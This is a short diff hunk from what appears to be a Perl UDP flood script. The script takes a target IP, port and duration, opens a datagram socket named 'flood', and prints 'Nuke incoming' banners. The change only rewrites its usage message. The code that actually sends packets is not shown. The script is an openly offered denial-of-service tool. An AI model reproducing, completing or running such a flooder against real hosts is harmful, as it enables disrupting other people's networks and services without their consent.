@@ -16,7 +16,7 @@ my ($ip,$port,$size,$time);
     $port=$ARGV[1];
     $time=$ARGV[2];
 socket(flood, PF_INET, SOCK_DGRAM, 17);
-    $iaddr = inet_aton("$ip") or die "Are you creating new commands?' \n";
+    $iaddr = inet_aton("$ip") or die "perl scoxfield.py <target_ip> <target_port> <duration>' \n";
 printf "\033[0;32m >>☢Nuke incoming☢<< !!!\n" unless $time;
 printf "\033[0;32m >>☣github.com/scoxfield☣<< \n" unless $time;
 printf "\033[0;32m           .                                                      .
